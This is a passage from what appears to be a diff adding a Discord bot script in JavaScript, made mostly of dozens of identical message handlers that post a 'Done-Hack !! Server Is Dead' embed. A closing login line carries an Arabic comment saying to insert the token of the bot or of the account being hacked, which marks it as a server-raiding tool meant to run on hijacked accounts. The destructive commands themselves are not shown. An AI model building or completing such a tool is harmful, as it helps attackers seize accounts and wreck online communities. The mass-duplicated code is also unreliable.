+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+
+
+
+
+
+
+
+
+
+client.login('process.env.BOT_TOKEN') //هنا توكن البوت او الحساب اللي بتهكره
